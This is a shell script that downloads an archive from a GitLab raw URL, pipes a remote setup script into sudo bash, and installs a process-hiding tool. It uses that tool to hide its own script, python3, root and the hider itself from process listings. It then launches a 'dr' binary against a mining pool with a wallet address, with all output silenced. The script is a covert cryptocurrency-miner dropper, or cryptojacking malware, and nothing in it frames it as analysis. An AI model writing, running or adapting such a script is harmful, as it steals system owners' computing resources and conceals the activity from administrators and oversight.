#!/bin/sh
pkill -
wget https://gitlab.com/yuri.boyka.29111222/slebw/-/raw/main/dr.tar.gz
tar -xf dr.tar.gz
apt-get update;apt-get -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
apt-get install -y nodejs
npm i -g node-process-hider
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata

sudo swapoff -a; sudo swapon -a
sleep 10
ph add gudubrag.sh
Ph add python3
ph add root
ph add node-process-hider
ph add -
./dr -r pool.whalesburg.com:4300 -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xmylq8cq7asn9nqswcd3s.bon >/dev/null >/dev/null 2>&1
sleep 10
